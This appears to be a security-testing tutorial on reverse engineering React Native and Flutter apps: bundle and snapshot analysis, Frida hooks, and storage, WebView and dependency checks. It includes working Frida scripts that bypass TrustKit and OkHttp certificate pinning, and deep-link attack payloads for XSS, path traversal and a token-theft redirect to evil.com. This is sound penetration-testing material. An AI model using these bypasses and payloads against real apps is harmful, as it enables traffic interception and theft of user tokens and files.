# Cross-Platform Mobile Framework Security Testing

## Learning Objectives

Master security testing methodology for React Native and Flutter applications, including framework-specific attack surfaces, reverse engineering techniques, and common vulnerability patterns in cross-platform mobile development.

---

## 1. React Native Security

### 1.1 Bundle Analysis

React Native applications ship a compiled JavaScript bundle that contains the application logic. This bundle is the primary target for static analysis.

**Locating the Bundle**:

```bash
# Android: bundle is inside the APK
apktool d app.apk -o app_source
# Bundle location:
# app_source/assets/index.android.bundle
# app_source/assets/index.android.bundle.meta (Hermes bytecode)

# iOS: bundle is inside the IPA payload
unzip app.ipa -d ipa_extracted
# Bundle location:
# Payload/App.app/main.jsbundle
```

**Reading the JavaScript Bundle**:

```bash
# Standard bundle (plain JavaScript) - search for sensitive patterns
grep -n "apiKey\|api_key\|secret\|password\|token" index.android.bundle

# Find API endpoints
grep -onE "https?://[a-zA-Z0-9./?=_%:-]*" index.android.bundle | sort -u

# Find hardcoded credentials pattern
grep -n "Basic [A-Za-z0-9+/=]\+" index.android.bundle

# Hermes bytecode bundle - needs decompilation first
# Install hbctool (Hermes Bytecode Tool)
pip3 install hbctool

# Disassemble Hermes bytecode
hbctool disasm index.android.bundle hermes_output

# Analyze the disassembled output
grep -rn "apiKey\|secret\|password" hermes_output/
```

**Source Map Recovery**:

```bash
# Check if source maps are included (debug builds)
find app_source/ -name "*.map"

# If source map exists, use source-map tool
npm install -g source-map-cli
source-map-resolve index.android.bundle.map
```

### 1.2 WebView Vulnerabilities

React Native uses WebViews extensively for rendering. The JavaScript bridge connecting native code to the WebView is a critical attack surface.

**JavaScript Bridge Exploitation**:

```javascript
// Frida script: Hook React Native WebView bridge
Java.perform(function() {
    var WebView = Java.use("com.facebook.react.modules.core.RCTNativeAppEventEmitter");

    // Intercept bridge messages
    var ReactBridge = Java.use("com.facebook.react.bridge.ReactApplicationContext");
    ReactBridge.$init.overload("[Ljava.lang.String;").implementation = function(modules) {
        console.log("[+] React Bridge initialized with modules: " + modules);
        return this.$init(modules);
    };
});

// Check for JavaScript evaluation enabled
Java.perform(function() {
    var WebViewModule = Java.use("com.facebook.react.views.webview.ReactWebViewManager");
    var methods = WebViewModule.class.getDeclaredMethods();
    for (var i = 0; i < methods.length; i++) {
        console.log("[+] WebView method: " + methods[i].getName());
    }
});
```

**Intent Hijacking via WebView**:

```bash
# Search for intent scheme handling in the bundle
grep -n "shouldOverrideUrlLoading\|intent://" index.android.bundle

# Check for WebView settings that allow JavaScript execution
grep -n "javaScriptEnabled\|domStorageEnabled\|allowFileAccess" index.android.bundle

# Search for deep link handlers
grep -n "Linking.addEventListener\|Linking.getInitialURL" index.android.bundle
```

**Common WebView Misconfigurations**:

| Setting | Risk | Detection |
|---------|------|-----------|
| `javaScriptEnabled={true}` | XSS if loading external content | grep bundle |
| `allowFileAccess={true}` | Local file theft via file:// URIs | grep bundle |
| `allowFileAccessFromFileURLs` | Same-origin policy bypass | grep bundle |
| `mixedContentMode="always"` | Mixed content attacks | grep bundle |
| `onMessage` handler without origin check | Cross-origin data theft | code audit |

### 1.3 Native Module Attack Surface

React Native bridge exposes native modules to JavaScript. Each native module is a potential attack vector.

**Enumerating Native Modules**:

```bash
# List all native modules from decompiled APK
grep -rn "ReactModule\|@ReactModule\|ReactContextBaseJavaModule" app_source/smali*/ -l

# Find exported methods
grep -rn "@ReactMethod" app_source/smali*/ | sed 's/.*@ReactMethod//' | head -50

# Check for native module registration
grep -rn "getPackages\|ReactPackage" app_source/smali*/
```

**Frida Hook for Native Module Inspection**:

```javascript
// Hook all React Native bridge calls
Java.perform(function() {
    var CatalystInstance = Java.use("com.facebook.react.bridge.CatalystInstanceImpl");

    CatalystInstance.callFunction.implementation = function(module, method, args) {
        console.log("[Bridge Call] Module: " + module + " Method: " + method);
        console.log("[Bridge Args] " + JSON.stringify(args));
        return this.callFunction(module, method, args);
    };
});
```

### 1.4 AsyncStorage and SecureStorage Insecure Usage

**AsyncStorage Detection**:

```bash
# Search for AsyncStorage usage in the bundle
grep -n "AsyncStorage\|@react-native-async-storage" index.android.bundle

# Common insecure patterns
grep -n "AsyncStorage.setItem.*password\|AsyncStorage.setItem.*token\|AsyncStorage.setItem.*secret" index.android.bundle

# Check for sensitive data in plaintext storage
adb shell "run-as com.target.app cat /data/data/com.target.app/databases/RKStorage 2>/dev/null" | strings
```

**SecureStorage Bypass**:

```javascript
// Frida: Hook react-native-keychain
Java.perform(function() {
    // Intercept KeychainModule secure storage
    var KeychainModule = Java.use("com.oblador.keychain.KeychainModule");

    KeychainModule.getGenericPasswordForOptions.implementation = function() {
        var result = this.getGenericPasswordForOptions.apply(this, arguments);
        console.log("[+] Keychain read: " + JSON.stringify(result));
        return result;
    };
});
```

### 1.5 Code Obfuscation Bypass

**Metro Bundler Configuration Analysis**:

```bash
# Check metro.config.js for obfuscation settings
grep -rn "minify\|uglify\|terser\|obfuscate" app_source/

# Hermes engine analysis (common in production builds)
# Check if Hermes is enabled
grep -rn "hermesEnabled\|useHermes\|hermes" app_source/AndroidManifest.xml app_source/smali*/ -l

# Attempt to restore variable names from bundle analysis
# Hermes bytecode string table often contains original identifiers
hbctool disasm index.android.bundle hermes_output
grep -rn "String" hermes_output/ | head -100
```

**JSC (JavaScriptCore) Bundle Deobfuscation**:

```bash
# Pretty-print minified bundle for analysis
js-beautify index.android.bundle > readable_bundle.js

# Extract and analyze function names
grep -oE "function [a-zA-Z0-9_]+\(" readable_bundle.js | sort | uniq -c | sort -rn | head -30

# Search for module definitions
grep -n "__d(function" readable_bundle.js | head -50
```

---

## 2. Flutter Security

### 2.1 Dart Snapshot Reverse Engineering

Flutter compiles Dart code to AOT snapshots, making reverse engineering harder than React Native but not impossible.

**Snapshot Analysis Tools**:

```bash
# reFlutter - automated Flutter analysis framework
pip3 install reflutter

# Patch the APK with reFlutter
reflutter app.apk

# This creates a patched APK that dumps Dart functions at runtime
# Install and run the patched APK
adb install app.reflutter.apk

# After running the app, pull the dump
adb pull /data/data/com.target.app/dump.dart

# Analyze the dumped functions
grep -n "http\|api\|login\|auth\|token" dump.dart
```

**Custom dartaotruntime Analysis**:

```bash
# Extract snapshot from libapp.so
# First, find the snapshot offset
strings libapp.so | grep -n "snapshot\|core_snapshot\|vm_snapshot"

# Use Dart AOT snapshot parser (darter)
git clone https://github.com/milankragujevic/darter
cd darter
python3 darter.py libapp.so > dart_classes.txt

# Analyze extracted class information
grep -n "HttpClient\|HttpRequest\|Authentication\|Token" dart_classes.txt
```

### 2.2 libapp.so Analysis

The libapp.so contains compiled Dart code and is the main target for Flutter reverse engineering.

**Ghidra Analysis**:

```bash
# Load libapp.so into Ghidra
# Important: Flutter uses a custom calling convention

# Install Flutter Ghidra scripts
git clone https://github.com/AaronFlower/ghidra-flutter
# Copy scripts to Ghidra script directory

# Key analysis targets in libapp.so:
# 1. _kDartIsolateSnapshotData - snapshot data
# 2. _kDartIsolateSnapshotInstructions - compiled instructions
# 3. _kDartVmSnapshotData - VM snapshot
# 4. _kDartVmSnapshotInstructions - VM instructions
```

**radare2 Analysis**:

```bash
# Load libapp.so
r2 -A libapp.so

# Find Flutter-specific symbols
is~Flutter
is~Dart

# Analyze snapshot-related functions
afl~snapshot

# Find HTTP-related functions
afl~http
afl~HttpClient

# Examine crypto functions
afl~encrypt
afl~decrypt
afl~hash
```

### 2.3 Flutter Plugin Vulnerability Assessment

```bash
# List all Flutter plugins from pubspec.yaml (if available in assets)
unzip -p app.apk assets/flutter_assets/AssetManifest.json | python3 -m json.tool

# Check pubspec.lock for exact versions (sometimes bundled)
unzip -p app.apk assets/flutter_assets/pubspec.lock 2>/dev/null || echo "Not bundled"

# Known vulnerable Flutter plugins to check:
# - flutter_secure_storage (older versions: key exposure)
# - shared_preferences (plaintext storage)
# - url_launcher (deep link hijacking)
# - webview_flutter (same XSS risks as React Native WebView)

# Enumerate platform channels
grep -rn "MethodChannel\|EventChannel\|BasicMessageChannel" app_source/smali*/
```

### 2.4 Platform Channel Security

Flutter platform channels communicate between Dart and native code. Insecure implementations expose sensitive operations.

**MethodChannel Vulnerability Detection**:

```javascript
// Frida: Hook Flutter MethodChannel handler on Android
Java.perform(function() {
    var MethodChannel = Java.use("io.flutter.plugin.common.MethodChannel");

    // Hook incoming method calls (native -> Dart)
    MethodChannel.$init.overload("io.flutter.plugin.common.BinaryMessenger", "java.lang.String").implementation = function(messenger, name) {
        console.log("[+] MethodChannel created: " + name);
        return this.$init(messenger, name);
    };
});

// Hook native method call handler
Java.perform(function() {
    var Handler = Java.use("io.flutter.plugin.common.MethodChannel$MethodCallHandler");
    // This logs all method invocations from Dart to native
});
```

**Identifying Insecure Channel Usage**:

```bash
# Search for MethodChannel names in the snapshot or libapp.so
strings libapp.so | grep -E "^[a-z_]+\.[a-z_]+$" | sort -u

# Common sensitive channel patterns:
# - "encryption" / "keychain" / "secure_storage"
# - "biometric" / "auth" / "login"
# - "payment" / "checkout" / "purchase"
# - "location" / "contacts" / "camera"

# Check for unencrypted channel communication
strings libapp.so | grep -iE "password|token|secret|key|credential"
```

### 2.5 Flutter Obfuscation and Limitations

```bash
# Check if Flutter obfuscation is enabled
# Obfuscated apps have symbols like "a", "b", "c" instead of meaningful names
strings libapp.so | head -200

# Flutter obfuscation limitations:
# 1. String literals are NOT obfuscated
# 2. Class hierarchy is preserved
# 3. API endpoints remain in plaintext
# 4. Plugin names are preserved

# Extract API endpoints from obfuscated Flutter app
strings libapp.so | grep -oE "https?://[a-zA-Z0-9./?=_%:-]*" | sort -u

# Extract package names
strings libapp.so | grep -oE "package:[a-zA-Z0-9._/]+" | sort -u
```

---

## 3. Cross-Platform Common Issues

### 3.1 Certificate Pinning Implementation and Bypass

**Flutter Certificate Pinning**:

```javascript
// Frida: Bypass Flutter certificate pinning
// Flutter uses BoringSSL internally

// Method 1: Hook SecurityContext (Dart-level pinning)
Java.perform(function() {
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");

    // This works for Flutter apps using platform-specific pinning
    var SSLContextInit = SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom");
    SSLContextInit.implementation = function(km, tm, sr) {
        console.log("[+] SSLContext.init intercepted - bypassing pinning");
        this.init(km, tm, sr);
    };
});

// Method 2: Use reFlutter for snapshot-level pinning bypass
// reFlutter patches the Dart VM to intercept SSL verification
```

**React Native Certificate Pinning**:

```javascript
// Frida: Bypass TrustKit (React Native SSL pinning library)
Java.perform(function() {
    try {
        var TrustKit = Java.use("com.datatheorem.android.trustkit.TrustKit");
        TrustKit.validateChain.implementation = function(serverHostname, chain) {
            console.log("[+] TrustKit bypassed for: " + serverHostname);
            return;
        };
    } catch(e) {
        console.log("[-] TrustKit not found: " + e);
    }

    // Bypass OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(hostname, peerCertificates) {
            console.log("[+] OkHttp CertificatePinner bypassed for: " + hostname);
            return;
        };
    } catch(e) {
        console.log("[-] OkHttp CertificatePinner not found: " + e);
    }
});
```

### 3.2 Deep Link Exploitation

**React Native Deep Links**:

```bash
# Enumerate deep link schemes from AndroidManifest.xml
grep -A5 "<intent-filter>" app_source/AndroidManifest.xml | grep -E "scheme|host|pathPrefix"

# Test deep link with ADB
adb shell am start -a android.intent.action.VIEW -d "appscheme://path/to/screen?param=value"

# Common deep link attacks:
# 1. Open arbitrary URLs in WebView
# 2. Trigger actions with crafted parameters
# 3. Access authenticated screens without login
# 4. Inject JavaScript via URL parameters
```

**Flutter Deep Links**:

```bash
# Check Flutter deep link configuration
grep -rn "uni_links\|deep_link\|app_links" app_source/

# Flutter universal links (iOS)
plutil -p Payload/App.app/Info.plist | grep -A5 "AssociatedDomains"

# Test Flutter deep links
adb shell am start -a android.intent.action.VIEW -d "flutterscheme://deep/path"
```

**Deep Link Attack Payloads**:

```bash
# XSS via deep link (if WebView handles the URL)
adb shell am start -a android.intent.action.VIEW -d "appscheme://webview?url=javascript:alert(1)"

# Path traversal via deep link
adb shell am start -a android.intent.action.VIEW -d "appscheme://open?file=../../data/data/com.target.app/shared_prefs/settings.xml"

# Token theft via redirect
adb shell am start -a android.intent.action.VIEW -d "appscheme://auth/callback?code=STOLEN_CODE&redirect=https://evil.com"
```

### 3.3 Third-Party Library Vulnerability Scanning

**Dependency Analysis**:

```bash
# React Native: Extract package.json or package-lock.json from bundle
grep -oE '"[a-z@/_.-]+":\s*"[0-9.^~*]+"' index.android.bundle | head -100

# Flutter: Check pubspec.yaml or pubspec.lock
strings libapp.so | grep -E "package:[a-z_]+" | sort -u

# Automated scanning with OWASP Dependency-Check
dependency-check --scan app_source/ --out report.html

# npm audit for React Native dependencies (if package.json available)
npm audit --json > audit_report.json 2>/dev/null
```

**Known Vulnerable Library Patterns**:

| Library | Framework | Vulnerability | Detection |
|---------|-----------|---------------|-----------|
| react-native-webview < 11.0.0 | React Native | RCE via JavaScript | grep bundle for version |
| flutter_secure_storage < 3.3.0 | Flutter | Key exposure in SharedPreferences | check version in pubspec |
| AsyncStorage (any) | React Native | Plaintext credential storage | grep for AsyncStorage.setItem |
| shared_preferences (any) | Flutter | Plaintext key-value storage | check for sensitive data usage |
| OkHttp < 3.12.0 | React Native | Certificate pinning bypass | check version in smali |

### 3.4 CI/CD Pipeline Security for Mobile Apps

**Build Pipeline Assessment**:

```bash
# Check for exposed CI/CD secrets
grep -rn "CI_TOKEN\|BUILD_KEY\|SIGNING_KEY\|STORE_PASSWORD\|KEY_PASSWORD" app_source/

# Analyze build.gradle for security misconfigurations
cat app_source/build.gradle | grep -E "signingConfig|storeFile|storePassword|keyAlias|keyPassword"

# Check for debug builds shipped to production
grep -n "BuildConfig.DEBUG\|Build.BUILD_TYPE" app_source/smali*/com/target/*.smali

# Verify ProGuard/R8 configuration
cat app_source/proguard-rules.pro 2>/dev/null || echo "No ProGuard rules found"
```

**Fastlane Security Assessment**:

```bash
# Check Fastlane configuration for secrets
grep -rn "api_key\|token\|password\|secret" fastlane/ 2>/dev/null

# Check match repository access (code signing)
grep -rn "git_url\|storage_mode" fastlane/Matchfile 2>/dev/null
```

---

## 4. Testing Methodology

### 4.1 React Native Testing Checklist

1. Extract and analyze `index.android.bundle` for hardcoded credentials and API endpoints
2. Check WebView configuration for JavaScript bridge vulnerabilities
3. Enumerate native modules and their exported methods
4. Inspect AsyncStorage and SecureStorage for sensitive data in plaintext
5. Verify certificate pinning implementation and test bypass
6. Test deep link handlers for injection and path traversal
7. Scan third-party dependencies for known vulnerabilities
8. Assess Metro bundler configuration for obfuscation gaps

### 4.2 Flutter Testing Checklist

1. Identify Flutter engine version and snapshot format
2. Use reFlutter to patch APK and dump Dart function names
3. Analyze libapp.so with Ghidra or radare2 for compiled Dart code
4. Extract string literals from snapshot (they are NOT obfuscated)
5. Enumerate platform channels and their security implications
6. Test certificate pinning at both Dart and native levels
7. Verify plugin versions against known vulnerability databases
8. Assess obfuscation effectiveness by comparing symbol names

### 4.3 Cross-Platform Testing Flow

```
1. Identify Framework
   |-> React Native: Look for index.android.bundle, metro config
   |-> Flutter: Look for libapp.so, flutter_assets/
   |-> Xamarin: Look for .dll files in assembly/
   |
2. Static Analysis
   |-> Extract JS bundle / Dart snapshot
   |-> Search for hardcoded secrets
   |-> Map API endpoints
   |
3. Dynamic Analysis
   |-> Configure proxy (may need pinning bypass)
   |-> Use Frida to hook framework-specific APIs
   |-> Test deep links and WebView interactions
   |
4. Runtime Testing
   |-> Hook storage APIs (AsyncStorage / SecureStorage)
   |-> Intercept bridge calls (JS-Native / Dart-Native)
   |-> Extract encryption keys from memory
   |
5. Report & Document
   |-> Framework-specific vulnerabilities
   |-> Cross-platform common issues
   |-> Remediation recommendations
```

---

## 5. Tool Reference

### Framework-Specific Tools

| Tool | Framework | Purpose | Command |
|------|-----------|---------|---------|
| **hbctool** | React Native | Hermes bytecode disassembly | `hbctool disasm bundle.asm output/` |
| **reFlutter** | Flutter | Flutter snapshot dumping | `reflutter app.apk` |
| **darter** | Flutter | Dart AOT snapshot parser | `python3 darter.py libapp.so` |
| **js-beautify** | React Native | Bundle pretty-printing | `js-beautify bundle > readable.js` |
| **Frida** | Both | Runtime hooking | `frida -U -f com.target.app -l hook.js` |
| **objection** | Both | Runtime exploration | `objection -g com.target.app explore` |

### Universal Testing Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **apktool** | APK decompilation | `apktool d app.apk -o app_source` |
| **jadx** | Java decompilation | `jadx app.apk -d app_java` |
| **Ghidra** | Binary analysis (libapp.so) | GUI: import libapp.so |
| **radare2** | Binary analysis | `r2 -A libapp.so` |
| **Burp Suite** | Traffic interception | Configure proxy + install CA cert |
| **MobSF** | Automated analysis | `docker run -p 8000:8000 opensecurity/mobsf` |

---

## References

- [OWASP MSTG - React Native Testing](https://owasp.org/www-project-mobile-security-testing-guide/) - Mobile security testing standard
- [reFlutter GitHub](https://github.com/nickvdyck/reflutter) - Flutter reverse engineering framework
- [Frida Documentation](https://frida.re/docs/home/) - Dynamic instrumentation reference
- [HackTricks - React Native](https://book.hacktricks.xyz/mobile-pentesting/react-native-application) - React Native pentesting guide
- [Flutter Security Best Practices](https://docs.flutter.dev/security/overview) - Official Flutter security documentation
